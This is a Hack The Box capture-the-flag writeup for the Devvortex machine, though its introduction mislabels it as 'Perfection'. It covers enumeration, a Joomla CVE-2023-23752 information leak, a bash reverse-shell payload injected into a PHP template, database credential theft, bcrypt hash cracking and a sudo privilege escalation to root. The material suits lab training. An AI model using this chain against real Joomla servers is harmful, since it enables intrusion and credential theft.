# Devvortex

## Introduction

This writeup details the exploitation process of the "Perfection" box on Hack The Box. The challenge is categorized as easy difficulty and involves several stages.

<figure><img src="../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

## Enumeration

### Nmap

```bash
nmap -A -Pn 10.10.11.242
```

<figure><img src="../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

### Adding Domain to Hosts File

```bash
echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
```

### Vhost Enumeration

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.devvortex.htb/ -fw 5080
```

<figure><img src="../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

### Adding Domain to Hosts File

```bash
echo "10.10.11.242 dev.devvortex.htb" | sudo tee -a /etc/hosts
```

<figure><img src="../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

### Directory Enumeration

```bash
dirsearch -u https://dev.devvortex.htb
```

<figure><img src="../.gitbook/assets/image (87).png" alt=""><figcaption><p><a href="http://dev.devvortex.htb/administrator/">http://dev.devvortex.htb/administrator/</a></p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (89).png" alt=""><figcaption><p>It time for Joomscan</p></figcaption></figure>

## Exploitation

### Joomscan Enumeration

```bash
joomscan -u http://dev.devvortex.htb/
```

<figure><img src="../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

Now, I got the Joomla version **Joomla 4.2.6.** Let find the vulnerability. ([https://github.com/Acceis/exploit-CVE-2023-23752](https://github.com/Acceis/exploit-CVE-2023-23752))

### Exploit-CVE-2023-23752

```bash
ruby exploit.rb http://dev.devvortex.htb
```

<figure><img src="../.gitbook/assets/image (91).png" alt=""><figcaption><p>lewis : P4ntherg0t1n5r3c0n##</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Go to System -> Template -> Administrator Templates

<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

Choose one of PHP and input the reverse shell command.

```bash
system('bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1"');
```

<figure><img src="../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

### Reverse Shell

<figure><img src="../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

### Import PUTTY

```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

### Connect to MySQL database

```bash
mysql -u lewis -p joomla --password=P4ntherg0t1n5r3c0n##
```

<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption><p>To see logan password</p></figcaption></figure>

```plsql
show tables;
```

<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption><p>sd4fg_users</p></figcaption></figure>

```sql
SELECT * from sd4fg_users;
```

<figure><img src="../.gitbook/assets/image (103).png" alt=""><figcaption><p>$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12</p></figcaption></figure>

### Crack Password <a href="#hash-identifier-usage-example" id="hash-identifier-usage-example"></a>

```bash
echo "$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12" >> hash.txt
```

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

* \-m 3200 (bcrypt $2\*$, Blowfish (Unix))
* /usr/share/wordlists/rockyou.txt (wordlist)

<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption><p>tequieromucho</p></figcaption></figure>

### Connect with SSH

```bash
ssh logan@10.10.11.242
```

### User Flag

<figure><img src="../.gitbook/assets/image (106).png" alt=""><figcaption><p>119da9b66730742b0d1a5c24b6006df7</p></figcaption></figure>

## Privilege Escalation

### Check sudo -l

<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

Cause of the lab is broken, I cannot rewrite the writeup I will screenshot of the another writeup to put here.

<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

```bash
What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
root@devvortex:/home/logan# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

```
root@devvortex:/home/logan# cat ~/root.txt
81df009efcd837a749211c494bfbb3e9
```

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
